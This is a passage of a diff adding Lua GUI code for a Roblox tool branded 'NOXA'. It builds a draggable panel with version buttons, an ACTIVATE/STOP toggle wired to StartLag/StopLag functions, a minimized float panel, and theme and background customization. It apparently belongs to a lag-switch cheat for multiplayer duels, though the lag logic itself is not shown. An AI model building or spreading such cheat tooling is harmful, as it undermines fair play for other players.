+        TextColor3 = ColorText,
+        TextSize = 14,
+        Font = Enum.Font.GothamBlack,
+        AutoButtonColor = false,
+        ZIndex = 6,
+        Parent = VersionRow
+    })
+    Corner(btn, 10)
+    local s = Create("UIStroke", {
+        Color = Accent,
+        Thickness = 1.2,
+        Transparency = 0.5,
+        Parent = btn
+    })
+    TrackAccent(s, "Color")
+    FX.clickFX(btn, s)
+    VersionButtons[ver] = btn
+
+    btn.MouseButton1Click:Connect(function()
+        Config.version = ver
+        VersionLabel.Text = ver
+        VersionBox.Text = ver
+        UpdateVersionButtons()
+        if Config.active then
+            StopLag()
+            task.wait(0.1)
+            StartLag()
+        end
+        SaveConfig()
+        FX.strokeFlash(StatusStroke, 4.5, 0.05)
+        FX.strokeFlash(InnerStroke2, 2.5, 0.1)
+        FX.shake(StatusHolder, 4, 6)
+    end)
+end
+UpdateVersionButtons()
+
+----------------------------------------------------------------
+-- Enable / Keybind / Activate
+----------------------------------------------------------------
+local EnableCard = Create("Frame", {
+    Position = UDim2.new(0, 0, 0, 238),
+    Size = UDim2.new(1, 0, 0, 40),
+    BackgroundColor3 = ColorCard,
+    BackgroundTransparency = 0.22,
+    BorderSizePixel = 0,
+    ZIndex = 6,
+    Parent = Main
+})
+Corner(EnableCard, 12)
+Stroke(EnableCard, 1)
+
+Create("TextLabel", {
+    Position = UDim2.new(0, 12, 0, 0),
+    Size = UDim2.new(0, 80, 1, 0),
+    BackgroundTransparency = 1,
+    Text = "ENABLE",
+    TextColor3 = ColorText,
+    TextSize = 11,
+    Font = Enum.Font.GothamBlack,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 7,
+    Parent = EnableCard
+})
+
+local KeybindBtn = Create("TextButton", {
+    Position = UDim2.new(0, 80, 0.5, -12),
+    Size = UDim2.new(0, 60, 0, 24),
+    BackgroundTransparency = 1,
+    Text = "[" .. Config.keybind.Name .. "]",
+    TextColor3 = ColorMuted,
+    TextSize = 10,
+    Font = Enum.Font.GothamBold,
+    AutoButtonColor = false,
+    ZIndex = 7,
+    Parent = EnableCard
+})
+
+local ActivateBtn = Create("TextButton", {
+    Position = UDim2.new(1, -100, 0.5, -15),
+    Size = UDim2.new(0, 92, 0, 30),
+    BackgroundColor3 = ColorBtn,
+    BorderSizePixel = 0,
+    Text = "ACTIVATE",
+    TextColor3 = Accent,
+    TextSize = 10,
+    Font = Enum.Font.GothamBlack,
+    AutoButtonColor = false,
+    ZIndex = 7,
+    Parent = EnableCard
+})
+Corner(ActivateBtn, 12)
+local ActStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.2,
+    Transparency = 0.45,
+    Parent = ActivateBtn
+})
+TrackAccent(ActStroke, "Color")
+FX.clickFX(ActivateBtn, ActStroke)
+
+local function UpdateActivateVisual()
+    if Config.active then
+        Tween(ActivateBtn, TweenFast, {BackgroundColor3 = Color3.fromRGB(200, 0, 0), TextColor3 = ColorWhite})
+        ActivateBtn.Text = "STOP"
+        StatusLabel.TextColor3 = Accent
+        FX.strokeFlash(StatusStroke, 4, 0.02)
+        FX.strokeFlash(ActStroke, 3, 0.05)
+    else
+        Tween(ActivateBtn, TweenFast, {BackgroundColor3 = ColorBtn, TextColor3 = Accent})
+        ActivateBtn.Text = "ACTIVATE"
+        StatusLabel.TextColor3 = ColorMuted
+    end
+    StatusLabel.Text = Config.active and "ONLINE" or "OFFLINE"
+    if not Config.active then TimerLabel.Text = "00:00" end
+    VersionScale.Scale = 0.82
+    Tween(VersionScale, TweenBack, {Scale = 1})
+    FX.shake(StatusHolder, Config.active and 5 or 3, 6)
+end
+
+local function DoToggle()
+    ToggleLag()
+    UpdateActivateVisual()
+    SaveConfig()
+end
+
+ActivateBtn.MouseButton1Click:Connect(DoToggle)
+UpdateActivateVisual()
+
+----------------------------------------------------------------
+-- Background / Customize button
+----------------------------------------------------------------
+local BgBtn = Create("TextButton", {
+    Name = "BackgroundBtn",
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 282),
+    Size = UDim2.new(0.8, 0, 0, 30),
+    BackgroundColor3 = ColorBtn,
+    BackgroundTransparency = 0.05,
+    Text = "CUSTOMIZE",
+    TextColor3 = Accent,
+    TextSize = 12,
+    Font = Enum.Font.GothamBlack,
+    AutoButtonColor = false,
+    ClipsDescendants = true,
+    ZIndex = 8,
+    Parent = Main
+})
+Corner(BgBtn, 10)
+TrackAccent(BgBtn, "TextColor3")
+local BgStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.2,
+    Transparency = 0.45,
+    Parent = BgBtn
+})
+TrackAccent(BgStroke, "Color")
+local BgScale = Create("UIScale", {Scale = 1, Parent = BgBtn})
+FX.ripple(BgBtn)
+
+BgBtn.MouseEnter:Connect(function()
+    Tween(BgScale, TweenFast, {Scale = 1.04})
+    Tween(BgBtn, TweenFast, {BackgroundTransparency = 0})
+    Tween(BgStroke, TweenFast, {Transparency = 0.15})
+end)
+BgBtn.MouseLeave:Connect(function()
+    Tween(BgScale, TweenFast, {Scale = 1})
+    Tween(BgBtn, TweenFast, {BackgroundTransparency = 0.05})
+    Tween(BgStroke, TweenFast, {Transparency = 0.45})
+end)
+
+----------------------------------------------------------------
+-- Floating mini panel (when minimized)
+----------------------------------------------------------------
+local Float = Create("Frame", {
+    Name = "FloatPanel",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 0, 0.55, 0),
+    Size = UDim2.new(0, 220, 0, 118),
+    BackgroundColor3 = ColorBg,
+    BorderSizePixel = 0,
+    Visible = false,
+    ZIndex = 50,
+    Parent = ScreenGui,
+    ClipsDescendants = true
+})
+Corner(Float, 18)
+local FloatStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.4,
+    Transparency = 0.3,
+    Parent = Float
+})
+TrackAccent(FloatStroke, "Color")
+local FloatScale = Create("UIScale", {Scale = Config.phoneScale, Parent = Float})
+FX.shadow(Float, 24, 0.4)
+
+local FloatBg = Create("ImageLabel", {
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundTransparency = 1,
+    Image = Config.bgImage,
+    ImageTransparency = 1 - Config.bgVisibility / 100,
+    ImageColor3 = Color3.fromRGB(160, 200, 235),
+    ScaleType = Enum.ScaleType.Crop,
+    ZIndex = 1,
+    Parent = Float
+})
+Corner(FloatBg, 18)
+if Config.bgImage == "" then FloatBg.Visible = false end
+
+local FloatTitle = Create("TextLabel", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 10),
+    Size = UDim2.new(1, -24, 0, 22),
+    BackgroundTransparency = 1,
+    Text = "NOXA",
+    TextColor3 = Accent,
+    TextSize = 15,
+    Font = Enum.Font.FredokaOne,
+    ZIndex = 52,
+    Parent = Float
+})
+TrackAccent(FloatTitle, "TextColor3")
+
+local FloatSub = Create("TextLabel", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 30),
+    Size = UDim2.new(1, -24, 0, 12),
+    BackgroundTransparency = 1,
+    Text = "discord.gg/noxaduels",
+    TextColor3 = ColorMuted,
+    TextSize = 9,
+    Font = Enum.Font.GothamMedium,
+    ZIndex = 52,
+    Parent = Float
+})
+
+local FloatAct = Create("TextButton", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 48),
+    Size = UDim2.new(1, -24, 0, 32),
+    BackgroundColor3 = ColorBtn,
+    BorderSizePixel = 0,
+    Text = "ACTIVATE",
+    TextColor3 = Accent,
+    TextSize = 12,
+    Font = Enum.Font.GothamBlack,
+    AutoButtonColor = false,
+    ZIndex = 53,
+    Parent = Float
+})
+Corner(FloatAct, 10)
+TrackAccent(Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.2,
+    Transparency = 0.4,
+    Parent = FloatAct
+}), "Color")
+FX.ripple(FloatAct)
+
+local FloatOpen = Create("TextButton", {
+    AnchorPoint = Vector2.new(0.5, 0),
+    Position = UDim2.new(0.5, 0, 0, 86),
+    Size = UDim2.new(1, -24, 0, 24),
+    BackgroundColor3 = Color3.fromRGB(28, 24, 34),
+    BorderSizePixel = 0,
+    Text = "Open",
+    TextColor3 = ColorMuted,
+    TextSize = 11,
+    Font = Enum.Font.GothamBold,
+    AutoButtonColor = false,
+    ZIndex = 53,
+    Parent = Float
+})
+Corner(FloatOpen, 8)
+TrackAccent(Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1,
+    Transparency = 0.55,
+    Parent = FloatOpen
+}), "Color")
+
+local function SyncFloat()
+    if Config.active then
+        FloatAct.Text = "STOP"
+        Tween(FloatAct, TweenFast, {BackgroundColor3 = Color3.fromRGB(200, 0, 0), TextColor3 = ColorWhite})
+    else
+        FloatAct.Text = "ACTIVATE"
+        Tween(FloatAct, TweenFast, {BackgroundColor3 = ColorBtn, TextColor3 = Accent})
+    end
+    FloatTitle.TextColor3 = Accent
+    FloatSub.Text = Config.active and ("ON · " .. Config.version) or "discord.gg/noxaduels"
+    FloatSub.TextColor3 = Config.active and Accent or ColorMuted
+end
+
+local function SyncFloatBg()
+    if not FloatBg then return end
+    if Config.bgImage == "" then
+        FloatBg.Visible = false
+    else
+        FloatBg.Visible = true
+        FloatBg.Image = Config.bgImage
+        FloatBg.ImageTransparency = 1 - Config.bgVisibility / 100
+        if BgImage then FloatBg.ImageColor3 = BgImage.ImageColor3 end
+    end
+end
+
+FloatAct.MouseButton1Click:Connect(DoToggle)
+
+local function Minimize()
+    Phone.Visible = false
+    Float.Visible = true
+    FloatScale.Scale = Config.phoneScale
+    SyncFloat()
+    SyncFloatBg()
+end
+
+local function Restore()
+    Phone.Visible = true
+    Float.Visible = false
+end
+
+MinimizeBtn.MouseButton1Click:Connect(Minimize)
+FloatOpen.MouseButton1Click:Connect(Restore)
+
+----------------------------------------------------------------
+-- Customize Panel
+----------------------------------------------------------------
+local Customize = Create("Frame", {
+    Name = "CustomizePanel",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.new(0.5, 170, 0.5, 0),
+    Size = UDim2.new(0, 240, 0, 300),
+    BackgroundColor3 = Color3.fromRGB(10, 16, 26),
+    BorderSizePixel = 0,
+    Visible = false,
+    ZIndex = 60,
+    Parent = ScreenGui
+})
+Corner(Customize, 16)
+local CustStroke = Create("UIStroke", {
+    Color = Accent,
+    Thickness = 1.3,
+    Transparency = 0.35,
+    Parent = Customize
+})
+TrackAccent(CustStroke, "Color")
+FX.shadow(Customize, 28, 0.4)
+local CustScale = Create("UIScale", {Scale = Config.customizeScale, Parent = Customize})
+local CustPos = Customize.Position
+
+Create("TextLabel", {
+    Position = UDim2.new(0, 12, 0, 8),
+    Size = UDim2.new(1, -44, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "Customize",
+    TextColor3 = ColorWhite,
+    TextSize = 14,
+    Font = Enum.Font.GothamBlack,
+    ZIndex = 62,
+    Parent = Customize
+})
+
+local CloseCust = Create("TextButton", {
+    Position = UDim2.new(1, -30, 0, 6),
+    Size = UDim2.new(0, 24, 0, 24),
+    BackgroundColor3 = Color3.fromRGB(14, 22, 34),
+    Text = "X",
+    TextColor3 = ColorMuted,
+    TextSize = 12,
+    Font = Enum.Font.GothamBold,
+    AutoButtonColor = false,
+    ZIndex = 63,
+    Parent = Customize
+})
+Corner(CloseCust, 7)
+
+TrackAccent(Create("Frame", {
+    Position = UDim2.new(0, 10, 0, 30),
+    Size = UDim2.new(1, -20, 0, 1),
+    BackgroundColor3 = Accent,
+    BorderSizePixel = 0,
+    ZIndex = 62,
+    Parent = Customize
+}), "BackgroundColor3")
+
+local Scroll = Create("ScrollingFrame", {
+    Position = UDim2.new(0, 8, 0, 38),
+    Size = UDim2.new(1, -16, 1, -46),
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    ScrollBarThickness = 2,
+    ScrollBarImageColor3 = Accent,
+    CanvasSize = UDim2.new(0, 0, 0, 0),
+    AutomaticCanvasSize = Enum.AutomaticSize.Y,
+    ZIndex = 61,
+    Parent = Customize
+})
+TrackAccent(Scroll, "ScrollBarImageColor3")
+
+Create("UIListLayout", {
+    Padding = UDim.new(0, 7),
+    SortOrder = Enum.SortOrder.LayoutOrder,
+    Parent = Scroll
+})
+Create("UIPadding", {
+    PaddingTop = UDim.new(0, 4),
+    PaddingBottom = UDim.new(0, 10),
+    Parent = Scroll
+})
+
+----------------------------------------------------------------
+-- Size sliders
+----------------------------------------------------------------
+local function MakeSlider(title, getValue, setValue)
+    Create("TextLabel", {
+        Size = UDim2.new(1, 0, 0, 14),
+        BackgroundTransparency = 1,
+        Text = title,
+        TextColor3 = ColorPink,
+        TextSize = 9,
+        Font = Enum.Font.GothamBlack,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        ZIndex = 62,
+        Parent = Scroll
+    })
+
+    local card = Create("Frame", {
+        Size = UDim2.new(1, 0, 0, 44),
+        BackgroundColor3 = ColorCard,
+        BackgroundTransparency = 0.3,
+        BorderSizePixel = 0,
+        ZIndex = 62,
+        Parent = Scroll
+    })
+    Corner(card, 8)
+
+    local pct = Create("TextLabel", {
+        Position = UDim2.new(1, -52, 0, 4),
+        Size = UDim2.new(0, 44, 0, 14),
+        BackgroundTransparency = 1,
+        Text = string.format("%d%%", math.floor(getValue() * 100 + 0.5)),
+        TextColor3 = Accent,
+        TextSize = 11,
+        Font = Enum.Font.GothamBlack,
+        TextXAlignment = Enum.TextXAlignment.Right,
+        ZIndex = 63,
+        Parent = card
+    })
+    TrackAccent(pct, "TextColor3")
+
+    local track = Create("Frame", {
+        Position = UDim2.new(0, 10, 0, 24),
+        Size = UDim2.new(1, -20, 0, 6),
+        BackgroundColor3 = Color3.fromRGB(40, 36, 48),
+        BorderSizePixel = 0,
+        ZIndex = 63,
+        Parent = card
+    })
+    Corner(track, 99)
+
+    local fill = Create("Frame", {
+        Size = UDim2.new(math.clamp((getValue() - 0.55) / 0.85, 0, 1), 0, 1, 0),
+        BackgroundColor3 = Accent,
+        BorderSizePixel = 0,
+        ZIndex = 64,
+        Parent = track
+    })
+    Corner(fill, 99)
+    TrackAccent(fill, "BackgroundColor3")
+
+    local knob = Create("Frame", {
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(math.clamp((getValue() - 0.55) / 0.85, 0, 1), 0, 0.5, 0),
+        Size = UDim2.new(0, 14, 0, 14),
+        BackgroundColor3 = ColorWhite,
+        BorderSizePixel = 0,
+        ZIndex = 65,
+        Parent = track
+    })
+    Corner(knob, 99)
+    TrackAccent(Create("UIStroke", {Color = Accent, Thickness = 1.5, Parent = knob}), "Color")
+
+    local dragging = false
+    local function setFromX(x)
+        local ratio = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
+        local val = 0.55 + ratio * 0.85
+        val = math.floor(val * 100 + 0.5) / 100
+        setValue(val)
+        fill.Size = UDim2.new(ratio, 0, 1, 0)
+        knob.Position = UDim2.new(ratio, 0, 0.5, 0)
+        pct.Text = string.format("%d%%", math.floor(val * 100 + 0.5))
+    end
+
+    track.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            setFromX(inp.Position.X)
+        end
+    end)
+    knob.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(inp)
+        if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
+            setFromX(inp.Position.X)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            if dragging then SaveConfig() end
+            dragging = false
+        end
+    end)
+end
+
+MakeSlider("PANEL SIZE", function() return Config.customizeScale end, function(v)
+    Config.customizeScale = v
+    CustScale.Scale = v
+end)
+
+MakeSlider("PHONE SIZE", function() return Config.phoneScale end, function(v)
+    Config.phoneScale = v
+    PhoneScale.Scale = v
+    if FloatScale then FloatScale.Scale = v end
+end)
+
+----------------------------------------------------------------
+-- Background picker
+----------------------------------------------------------------
+Create("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 14),
+    BackgroundTransparency = 1,
+    Text = "BACKGROUND",
+    TextColor3 = ColorPink,
+    TextSize = 9,
+    Font = Enum.Font.GothamBlack,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 62,
+    Parent = Scroll
+})
+
+local BgGrid = Create("Frame", {
+    Size = UDim2.new(1, 0, 0, 110),
+    BackgroundTransparency = 1,
+    ZIndex = 62,
+    Parent = Scroll
+})
+Create("UIGridLayout", {
+    CellSize = UDim2.new(0, 60, 0, 60),
+    CellPadding = UDim2.new(0, 4, 0, 4),
+    SortOrder = Enum.SortOrder.LayoutOrder,
+    Parent = BgGrid
+})
+
+local BgImages = {
+    {img = ""},
+    {img = "rbxassetid://90631990302263"},
+    {img = "rbxassetid://109619268613730"},
+    {img = "rbxassetid://88369503310562"},
+    {img = "rbxassetid://90453834580322"},
+    {img = "rbxassetid://135181794444219"},
+}
+
+local selectedBgStroke = nil
+for i, data in ipairs(BgImages) do
+    local btn = Create("ImageButton", {
+        LayoutOrder = i,
+        BackgroundColor3 = Color3.fromRGB(10, 14, 14),
+        BorderSizePixel = 0,
+        Image = data.img,
+        ImageTransparency = data.img == "" and 1 or 0.15,
+        ScaleType = Enum.ScaleType.Crop,
+        AutoButtonColor = false,
+        ZIndex = 63,
+        Parent = BgGrid
+    })
+    Corner(btn, 7)
+    local s = Create("UIStroke", {
+        Color = Color3.fromRGB(55, 55, 65),
+        Transparency = 0.4,
+        Thickness = 1.5,
+        Parent = btn
+    })
+    local lbl = Create("TextLabel", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Text = data.img == "" and "None" or "",
+        TextColor3 = Color3.fromRGB(200, 200, 220),
+        TextSize = 8,
+        Font = Enum.Font.GothamBold,
+        ZIndex = 64,
+        Parent = btn
+    })
+    if data.img == "" then lbl.TextTransparency = 0 else lbl.TextTransparency = 0.6 end
+
+    if data.img == Config.bgImage then
+        selectedBgStroke = s
+        s.Color = Accent
+        s.Transparency = 0
+    end
+
+    btn.MouseButton1Click:Connect(function()
+        if selectedBgStroke then
+            Tween(selectedBgStroke, TweenFast, {Color = Color3.fromRGB(55, 55, 65), Transparency = 0.4})
+        end
+        selectedBgStroke = s
+        Tween(s, TweenFast, {Color = Accent, Transparency = 0})
+        Config.bgImage = data.img
+        if data.img == "" then
+            BgImage.Visible = false
+        else
+            BgImage.Visible = true
+            BgImage.Image = data.img
+        end
+        SyncFloatBg()
+        SaveConfig()
+    end)
+end
+
+----------------------------------------------------------------
+-- Image visibility
+----------------------------------------------------------------
+Create("Frame", {
+    Size = UDim2.new(1, 0, 0, 4),
+    BackgroundTransparency = 1,
+    ZIndex = 62,
+    Parent = Scroll
+})
+Create("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 14),
+    BackgroundTransparency = 1,
+    Text = "IMAGE VISIBILITY",
+    TextColor3 = ColorPink,
+    TextSize = 9,
+    Font = Enum.Font.GothamBlack,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 62,
+    Parent = Scroll
+})
+
+local VisCard = Create("Frame", {
+    Size = UDim2.new(1, 0, 0, 36),
+    BackgroundColor3 = ColorCard,
+    BackgroundTransparency = 0.3,
+    BorderSizePixel = 0,
+    ZIndex = 62,
+    Parent = Scroll
+})
+Corner(VisCard, 8)
+
+local VisMinus = Create("TextButton", {
+    Position = UDim2.new(0, 6, 0.5, -13),
+    Size = UDim2.new(0, 26, 0, 26),
+    BackgroundColor3 = ColorBtn,
+    Text = "-",
+    TextColor3 = ColorWhite,
+    TextSize = 15,
+    Font = Enum.Font.GothamBlack,
+    AutoButtonColor = false,
+    ZIndex = 63,
+    Parent = VisCard
+})
+Corner(VisMinus, 7)
+
+local VisPct = Create("TextLabel", {
+    Position = UDim2.new(0, 36, 0.5, -10),
+    Size = UDim2.new(1, -72, 0, 20),
+    BackgroundTransparency = 1,
+    Text = tostring(Config.bgVisibility) .. "%",
+    TextColor3 = Accent,
+    TextSize = 12,
+    Font = Enum.Font.GothamBlack,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    ZIndex = 63,
+    Parent = VisCard
+})
+TrackAccent(VisPct, "TextColor3")
+
+local VisPlus = Create("TextButton", {
+    Position = UDim2.new(1, -32, 0.5, -13),
+    Size = UDim2.new(0, 26, 0, 26),
+    BackgroundColor3 = ColorBtn,
+    Text = "+",
+    TextColor3 = ColorWhite,
+    TextSize = 15,
+    Font = Enum.Font.GothamBlack,
+    AutoButtonColor = false,
+    ZIndex = 63,
+    Parent = VisCard
+})
+Corner(VisPlus, 7)
+
+local function SetVisibility(v)
+    v = math.clamp(math.floor(v / 5 + 0.5) * 5, 0, 100)
+    Config.bgVisibility = v
+    VisPct.Text = v .. "%"
+    if BgImage then
+        Tween(BgImage, TweenMed, {ImageTransparency = 1 - v / 100})
+    end
+    SyncFloatBg()
+    SaveConfig()
+end
+SetVisibility(Config.bgVisibility)
+VisMinus.MouseButton1Click:Connect(function() SetVisibility(Config.bgVisibility - 5) end)
+VisPlus.MouseButton1Click:Connect(function() SetVisibility(Config.bgVisibility + 5) end)
+
+----------------------------------------------------------------
+-- Theme picker
+----------------------------------------------------------------
+Create("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 14),
+    BackgroundTransparency = 1,
+    Text = "NOXA THEME",
+    TextColor3 = ColorPink,
+    TextSize = 9,
+    Font = Enum.Font.GothamBlack,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    ZIndex = 62,
+    Parent = Scroll
+})
+
+local ThemeGrid = Create("Frame", {
+    Size = UDim2.new(1, 0, 0, 90),
+    BackgroundTransparency = 1,
+    ZIndex = 62,
+    Parent = Scroll
+})
+Create("UIGridLayout", {
+    CellSize = UDim2.new(0, 48, 0, 36),
+    CellPadding = UDim2.new(0, 4, 0, 4),
+    SortOrder = Enum.SortOrder.LayoutOrder,
+    Parent = ThemeGrid
+})
+
+local function ApplyTheme(theme)
+    if not theme then return end
+    Accent = theme.accent
+    A2 = theme.a2
+    Config.themeName = theme.name
+
+    for _, t in ipairs(AccentTargets) do
+        pcall(function()
+            if t.inst and t.inst.Parent then
+                t.inst[t.prop] = Accent
+            end
+        end)
+    end
+
+    pcall(function()
+        InnerStroke.Color = Accent
+        CustStroke.Color = Accent
+        Title.TextColor3 = Accent
+        FloatTitle.TextColor3 = Accent
+        if FloatStroke then FloatStroke.Color = Accent end
+        if BgImage then
+            BgImage.ImageColor3 = Color3.fromRGB(
+                math.clamp(math.floor(theme.accent.R * 180 + 70), 0, 255),
+                math.clamp(math.floor(theme.accent.G * 140 + 60), 0, 255),
+                math.clamp(math.floor(theme.accent.B * 160 + 90), 0, 255)
+            )
+        end
+        if BillGrad then
+            BillGrad.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0, Accent),
+                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 220)),
+                ColorSequenceKeypoint.new(1, Accent)
+            })
+        end
+        SyncFloatBg()
+        UpdateActivateVisual()
+        UpdateVersionButtons()
+        SyncFloat()
+    end)
+    SaveConfig()
+end
+
+local selectedThemeStroke = nil
+for i, theme in ipairs(Themes) do
+    local btn = Create("TextButton", {
+        LayoutOrder = i,
+        BackgroundColor3 = theme.ad,
+        BorderSizePixel = 0,
+        Text = "",
+        AutoButtonColor = false,
+        ZIndex = 63,
+        Parent = ThemeGrid
+    })
+    Corner(btn, 8)
+    Create("UIGradient", {
+        Rotation = 25,
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, theme.ad),
+            ColorSequenceKeypoint.new(0.5, theme.accent),
+            ColorSequenceKeypoint.new(1, theme.a2)
+        }),
+        Parent = btn
+    })
+    local s = Create("UIStroke", {
+        Color = Color3.fromRGB(55, 55, 65),
+        Thickness = 1.3,
+        Transparency = 0.35,
+        Parent = btn
+    })
+    Create("TextLabel", {
+        AnchorPoint = Vector2.new(0.5, 1),
+        Position = UDim2.new(0.5, 0, 1, -2),
+        Size = UDim2.new(1, -2, 0, 10),
+        BackgroundTransparency = 1,
+        Text = theme.name:upper(),
+        TextColor3 = Color3.fromRGB(12, 12, 14),
+        TextSize = 7,
+        Font = Enum.Font.GothamBlack,
+        ZIndex = 64,
+        Parent = btn
+    })
+
+    if theme.name == Config.themeName then
+        selectedThemeStroke = s
+        ApplyTheme(theme)
+        s.Color = Accent
+        s.Transparency = 0
+    end
+
+    btn.MouseButton1Click:Connect(function()
+        if selectedThemeStroke then
+            Tween(selectedThemeStroke, TweenFast, {Color = Color3.fromRGB(55, 55, 65), Transparency = 0.4})
+        end
+        selectedThemeStroke = s
+        ApplyTheme(theme)
+        Tween(s, TweenFast, {Color = Accent, Transparency = 0})
+    end)
+end
+
+----------------------------------------------------------------
+-- Customize open/close
+----------------------------------------------------------------
+local custOpen = false
+local function FadeCust(alpha, info)
+    Tween(Customize, info, {BackgroundTransparency = alpha})
+    Tween(CustStroke, info, {Transparency = 0.35 + alpha * 0.65})
+    for _, d in ipairs(Customize:GetDescendants()) do
+        if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
+            Tween(d, info, {TextTransparency = alpha})
+        end
+    end
+end
+
+local function OpenCustomize()
+    if custOpen then return end
+    custOpen = true
+    Customize.Visible = true
+    Customize.Position = UDim2.new(CustPos.X.Scale, CustPos.X.Offset - 18, CustPos.Y.Scale, CustPos.Y.Offset + 26)
+    CustScale.Scale = Config.customizeScale * 0.78
+    FadeCust(1, TweenInfo.new(0))
+    FadeCust(0, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out))
+    Tween(CustScale, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = Config.customizeScale})
+    Tween(Customize, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = CustPos})
+end
+
+local function CloseCustomize()
+    if not custOpen then return end
+    custOpen = false
+    Tween(CustScale, TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Scale = Config.customizeScale * 0.8})
+    Tween(Customize, TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
+        Position = UDim2.new(CustPos.X.Scale, CustPos.X.Offset + 14, CustPos.Y.Scale, CustPos.Y.Offset + 20)
+    })
+    FadeCust(1, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In))
+    task.delay(0.26, function()
+        if not custOpen then
+            Customize.Visible = false
+            Customize.Position = CustPos
+        end
+    end)
+end
+
+CloseCust.MouseButton1Click:Connect(CloseCustomize)
+
+local function ToggleCustomize()
+    if custOpen then CloseCustomize() else OpenCustomize() end
+end
+
+BgBtn.MouseButton1Click:Connect(function()
+    Tween(BgScale, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {Scale = 0.92})
+    task.delay(0.12, function() Tween(BgScale, TweenBack, {Scale = 1}) end)
+    ToggleCustomize()
+end)
+
+----------------------------------------------------------------
+-- Dragging (Phone + Customize + Float)
+----------------------------------------------------------------
+-- Phone drag
+do
+    local dragging, startPos, startFrame
+    local function begin(inp)
+        if inp.UserInputType ~= Enum.UserInputType.MouseButton1 and inp.UserInputType ~= Enum.UserInputType.Touch then return end
+        dragging = true
+        startPos = inp.Position
+        startFrame = Phone.Position
+    end
+    Header.InputBegan:Connect(begin)
+    Phone.InputBegan:Connect(begin)
+    UserInputService.InputChanged:Connect(function(inp)
+        if not dragging then return end
+        if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
+        local delta = inp.Position - startPos
+        Phone.Position = UDim2.new(startFrame.X.Scale, startFrame.X.Offset + delta.X, startFrame.Y.Scale, startFrame.Y.Offset + delta.Y)
+    end)
+    UserInputService.InputEnded:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            if dragging then
+                dragging = false
+                Config.posSX = Phone.Position.X.Scale
+                Config.posOX = Phone.Position.X.Offset
+                Config.posSY = Phone.Position.Y.Scale
+                Config.posOY = Phone.Position.Y.Offset
+                SaveConfig()
+            end
+        end
+    end)
+end
+
+-- Customize drag
+do
+    local dragging, startPos, startFrame
+    Create("TextButton", {
+        Size = UDim2.new(1, -40, 0, 30),
+        Position = UDim2.new(0, 0, 0, 0),
+        BackgroundTransparency = 1,
+        Text = "",
+        AutoButtonColor = false,
+        ZIndex = 70,
+        Parent = Customize
+    }).InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            startPos = inp.Position
+            startFrame = Customize.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(inp)
+        if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
+            local delta = inp.Position - startPos
+            Customize.Position = UDim2.new(startFrame.X.Scale, startFrame.X.Offset + delta.X, startFrame.Y.Scale, startFrame.Y.Offset + delta.Y)
+            CustPos = Customize.Position
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+end
+
+-- Float drag
+do
